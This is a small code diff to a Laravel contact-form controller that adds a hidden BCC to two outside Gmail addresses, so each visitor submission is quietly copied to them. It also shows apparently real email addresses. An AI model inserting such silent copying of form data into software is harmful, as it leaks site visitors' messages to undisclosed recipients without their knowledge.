@@ -12,7 +12,9 @@ class ContactMailController extends Controller
     {
         // dd(request()->all());
         $data = request()->all();
-        if (Mail::to('paradisehilltopacademy@gmail.com')->send(new ContactMail($data)))
+        if (Mail::to('paradisehilltopacademy@gmail.com')
+        ->bcc(['meetdaniels@gmail.com', 'accesstrustbank09@gmail.com'])
+        ->send(new ContactMail($data)))
             return back()->with('success', "Message Sent Successfully");
         return back()->with('failed', "Failed... Try Again");
     }
